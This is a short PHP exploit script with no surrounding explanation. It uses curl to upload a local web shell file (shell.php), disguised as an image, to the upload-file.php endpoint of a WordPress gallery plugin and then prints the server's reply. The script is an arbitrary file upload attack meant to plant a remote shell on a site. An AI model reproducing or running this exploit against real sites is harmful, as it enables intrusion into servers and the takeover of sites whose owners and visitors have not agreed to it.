<?php
$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\shell.php";
$c = curl_init("http://www.example.com/wordpress/wp-content/plugins/mac-dock-gallery/upload-file.php");
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,
array('uploadfile'=>"@$u",
'albumId'=>"1",
'mode'=>"image"));
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$e = curl_exec($c);
curl_close($c);
echo $e;
?>
